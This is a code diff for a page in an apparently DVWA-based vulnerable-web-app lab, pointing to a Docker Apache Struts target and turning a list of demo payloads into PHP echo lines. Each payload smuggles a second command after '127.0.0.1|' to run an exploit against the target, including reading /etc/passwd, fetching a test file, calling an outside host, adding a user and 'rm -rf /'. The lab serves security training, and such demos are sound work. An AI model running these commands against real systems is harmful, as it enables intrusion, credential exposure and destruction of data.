@@ -56,16 +56,13 @@ $page[ 'body' ] .= "
 	<h2>Requirement: </h2>
   <h2>https://hub.docker.com/repository/docker/andrefernandes86/demo-apachestruts-target </h2>
   <h2>docker run -d --rm -p 81:8080 andrefernandes86/demo-apachestruts-target </h2>
-
-	<ul>
-		<li> 127.0.0.1| python exploit.py http://target-ip/hello "ls -la" </li>
-		<li> 127.0.0.1| python exploit.py http://target-ip/hello "cat /etc/passwd" </li>
-		<li> 127.0.0.1| python exploit.py http://target-ip/hello "wget http://2016.eicar.org/download/eicar.com" </li>
-		<li> 127.0.0.1| python exploit.py http://target-ip/hello "curl http://wrs21.winshipway.com/" </li>
-		<li> 127.0.0.1| python exploit.py http://target-ip/hello "adduser xxxxx" </li>
-		<li> 127.0.0.1| python exploit.py http://target-ip/hello "ls -la" </li>
-		<li> 127.0.0.1| python exploit.py http://target-ip/hello "rm -rf /" </li>
-	</ul>
+		echo '127.0.0.1| python exploit.py http://target-ip/hello "ls -la"';
+		echo '127.0.0.1| python exploit.py http://target-ip/hello "cat /etc/passwd"';
+		echo '127.0.0.1| python exploit.py http://target-ip/hello "wget http://2016.eicar.org/download/eicar.com"';
+		echo '127.0.0.1| python exploit.py http://target-ip/hello "curl http://wrs21.winshipway.com/"';
+		echo '127.0.0.1| python exploit.py http://target-ip/hello "adduser xxxxx"';
+		echo '127.0.0.1| python exploit.py http://target-ip/hello "ls -la"';
+		echo '127.0.0.1| python exploit.py http://target-ip/hello "rm -rf /"';
 </div>\n";
 
 dvwaHtmlEcho( $page );
